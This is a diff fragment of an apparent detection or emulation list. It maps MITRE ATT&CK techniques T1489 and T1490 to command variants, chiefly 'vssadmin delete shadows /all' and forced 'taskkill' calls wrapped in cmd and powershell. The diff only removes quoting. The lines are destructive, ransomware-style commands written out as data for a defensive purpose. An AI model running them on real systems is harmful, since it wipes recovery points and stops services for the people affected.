-T1489 cmd /c "taskkill.exe /F /IM ${process_name} /T"
-T1489 powershell -c "taskkill.exe /F /IM ${process_name} /T"
+T1489 cmd /c taskkill.exe /F /IM ${process_name} /T
+T1489 powershell -c taskkill.exe /F /IM ${process_name} /T
 T1489 taskkill /f /IM ${process_name}
-T1489 cmd /c "taskkill /f /IM ${process_name}"
-T1489 powershell -c "taskkill /f /IM ${process_name}"
+T1489 cmd /c taskkill /f /IM ${process_name}
+T1489 powershell -c taskkill /f /IM ${process_name}
 T1489 taskkill.exe /f /IM ${process_name}
-T1489 cmd /c "taskkill.exe /f /IM ${process_name}"
-T1489 powershell -c "taskkill.exe /f /IM ${process_name}"
+T1489 cmd /c taskkill.exe /f /IM ${process_name}
+T1489 powershell -c taskkill.exe /f /IM ${process_name}
 T1489 taskkill /f /IM ${process_name} /T
-T1489 cmd /c "taskkill /f /IM ${process_name} /T"
-T1489 powershell -c "taskkill /f /IM ${process_name} /T"
+T1489 cmd /c taskkill /f /IM ${process_name} /T
+T1489 powershell -c taskkill /f /IM ${process_name} /T
 T1489 taskkill.exe /f /IM ${process_name} /T
-T1489 cmd /c "taskkill.exe /f /IM ${process_name} /T"
-T1489 powershell -c "taskkill.exe /f /IM ${process_name} /T"
+T1489 cmd /c taskkill.exe /f /IM ${process_name} /T
+T1489 powershell -c taskkill.exe /f /IM ${process_name} /T
 
 # T1490 Inhibit System Recovery
 T1490 vssadmin delete shadows /all
-T1490 cmd /c "vssadmin delete shadows /all"
-T1490 powershell -c "vssadmin delete shadows /all"
+T1490 cmd /c vssadmin delete shadows /all
+T1490 powershell -c vssadmin delete shadows /all
 T1490 vssadmin.exe delete shadows /all
-T1490 cmd /c "vssadmin.exe delete shadows /all"
-T1490 powershell -c "vssadmin.exe delete shadows /all"
+T1490 cmd /c vssadmin.exe delete shadows /all
+T1490 powershell -c vssadmin.exe delete shadows /all
 T1490 vssadmin delete shadows /all /quiet
-T1490 cmd /c "vssadmin delete shadows /all /quiet"
-T1490 powershell -c "vssadmin delete shadows /all /quiet"
+T1490 cmd /c vssadmin delete shadows /all /quiet
+T1490 powershell -c vssadmin delete shadows /all /quiet
 T1490 vssadmin.exe delete shadows /all /quiet
-T1490 cmd /c "vssadmin.exe delete shadows /all /quiet"
-T1490 powershell -c "vssadmin.exe delete shadows /all /quiet"
+T1490 cmd /c vssadmin.exe delete shadows /all /quiet
+T1490 powershell -c vssadmin.exe delete shadows /all /quiet
 T1490 vssadmin Delete Shadows /all
-T1490 cmd /c "vssadmin Delete Shadows /all"
-T1490 powershell -c "vssadmin Delete Shadows /all"
+T1490 cmd /c vssadmin Delete Shadows /all
+T1490 powershell -c vssadmin Delete Shadows /all
 T1490 vssadmin.exe Delete Shadows /all
-T1490 cmd /c "vssadmin.exe Delete Shadows /all"
-T1490 powershell -c "vssadmin.exe Delete Shadows /all"
+T1490 cmd /c vssadmin.exe Delete Shadows /all
+T1490 powershell -c vssadmin.exe Delete Shadows /all
 T1490 vssadmin Delete Shadows /all /quiet
-T1490 cmd /c "vssadmin Delete Shadows /all /quiet"
-T1490 powershell -c "vssadmin Delete Shadows /all /quiet"
+T1490 cmd /c vssadmin Delete Shadows /all /quiet
+T1490 powershell -c vssadmin Delete Shadows /all /quiet
 T1490 vssadmin.exe Delete Shadows /all /quiet
-T1490 cmd /c "vssadmin.exe Delete Shadows /all /quiet"
-T1490 powershell -c "vssadmin.exe Delete Shadows /all /quiet"
+T1490 cmd /c vssadmin.exe Delete Shadows /all /quiet
+T1490 powershell -c vssadmin.exe Delete Shadows /all /quiet
 T1490 vssadmin delete shadows /all /Quiet
-T1490 cmd /c "vssadmin delete shadows /all /Quiet"
-T1490 powershell -c "vssadmin delete shadows /all /Quiet"
+T1490 cmd /c vssadmin delete shadows /all /Quiet
+T1490 powershell -c vssadmin delete shadows /all /Quiet
 T1490 vssadmin.exe delete shadows /all /Quiet
-T1490 cmd /c "vssadmin.exe delete shadows /all /Quiet"
-T1490 powershell -c "vssadmin.exe delete shadows /all /Quiet"
+T1490 cmd /c vssadmin.exe delete shadows /all /Quiet
+T1490 powershell -c vssadmin.exe delete shadows /all /Quiet
 T1490 vssadmin Delete Shadows /all /Quiet
-T1490 cmd /c "vssadmin Delete Shadows /all /Quiet"
-T1490 powershell -c "vssadmin Delete Shadows /all /Quiet"
+T1490 cmd /c vssadmin Delete Shadows /all /Quiet
+T1490 powershell -c vssadmin Delete Shadows /all /Quiet
 T1490 vssadmin.exe Delete Shadows /all /Quiet
-T1490 cmd /c "vssadmin.exe Delete Shadows /all /Quiet"
-T1490 powershell -c "vssadmin.exe Delete Shadows /all /Quiet"
+T1490 cmd /c vssadmin.exe Delete Shadows /all /Quiet
+T1490 powershell -c vssadmin.exe Delete Shadows /all /Quiet
 T1490 vssadmin delete shadows /All
-T1490 cmd /c "vssadmin delete shadows /All"
-T1490 powershell -c "vssadmin delete shadows /All"
+T1490 cmd /c vssadmin delete shadows /All
+T1490 powershell -c vssadmin delete shadows /All
 T1490 vssadmin.exe delete shadows /All
-T1490 cmd /c "vssadmin.exe delete shadows /All"
-T1490 powershell -c "vssadmin.exe delete shadows /All"
+T1490 cmd /c vssadmin.exe delete shadows /All
+T1490 powershell -c vssadmin.exe delete shadows /All
 T1490 vssadmin delete shadows /All /quiet
-T1490 cmd /c "vssadmin delete shadows /All /quiet"
-T1490 powershell -c "vssadmin delete shadows /All /quiet"
+T1490 cmd /c vssadmin delete shadows /All /quiet
+T1490 powershell -c vssadmin delete shadows /All /quiet
 T1490 vssadmin.exe delete shadows /All /quiet
-T1490 cmd /c "vssadmin.exe delete shadows /All /quiet"
-T1490 powershell -c "vssadmin.exe delete shadows /All /quiet"
+T1490 cmd /c vssadmin.exe delete shadows /All /quiet
+T1490 powershell -c vssadmin.exe delete shadows /All /quiet
 T1490 vssadmin Delete Shadows /All
-T1490 cmd /c "vssadmin Delete Shadows /All"
-T1490 powershell -c "vssadmin Delete Shadows /All"
+T1490 cmd /c vssadmin Delete Shadows /All
+T1490 powershell -c vssadmin Delete Shadows /All
 T1490 vssadmin.exe Delete Shadows /All
-T1490 cmd /c "vssadmin.exe Delete Shadows /All"
-T1490 powershell -c "vssadmin.exe Delete Shadows /All"
+T1490 cmd /c vssadmin.exe Delete Shadows /All
+T1490 powershell -c vssadmin.exe Delete Shadows /All
 T1490 vssadmin Delete Shadows /All /quiet
-T1490 cmd /c "vssadmin Delete Shadows /All /quiet"
-T1490 powershell -c "vssadmin Delete Shadows /All /quiet"
+T1490 cmd /c vssadmin Delete Shadows /All /quiet
+T1490 powershell -c vssadmin Delete Shadows /All /quiet
 T1490 vssadmin.exe Delete Shadows /All /quiet
-T1490 cmd /c "vssadmin.exe Delete Shadows /All /quiet"
-T1490 powershell -c "vssadmin.exe Delete Shadows /All /quiet"
+T1490 cmd /c vssadmin.exe Delete Shadows /All /quiet
+T1490 powershell -c vssadmin.exe Delete Shadows /All /quiet
 T1490 vssadmin delete shadows /All /Quiet
-T1490 cmd /c "vssadmin delete shadows /All /Quiet"
-T1490 powershell -c "vssadmin delete shadows /All /Quiet"
+T1490 cmd /c vssadmin delete shadows /All /Quiet
+T1490 powershell -c vssadmin delete shadows /All /Quiet
 T1490 vssadmin.exe delete shadows /All /Quiet
-T1490 cmd /c "vssadmin.exe delete shadows /All /Quiet"
-T1490 powershell -c "vssadmin.exe delete shadows /All /Quiet"
+T1490 cmd /c vssadmin.exe delete shadows /All /Quiet
+T1490 powershell -c vssadmin.exe delete shadows /All /Quiet
 T1490 vssadmin Delete Shadows /All /Quiet
-T1490 cmd /c "vssadmin Delete Shadows /All /Quiet"
-T1490 powershell -c "vssadmin Delete Shadows /All /Quiet"
+T1490 cmd /c vssadmin Delete Shadows /All /Quiet
+T1490 powershell -c vssadmin Delete Shadows /All /Quiet
 T1490 vssadmin.exe Delete Shadows /All /Quiet
-T1490 cmd /c "vssadmin.exe Delete Shadows /All /Quiet"
-T1490 powershell -c "vssadmin.exe Delete Shadows /All /Quiet"
+T1490 cmd /c vssadmin.exe Delete Shadows /All /Quiet
+T1490 powershell -c vssadmin.exe Delete Shadows /All /Quiet
 
 # T1491.001 Defacement: Internal Defacement
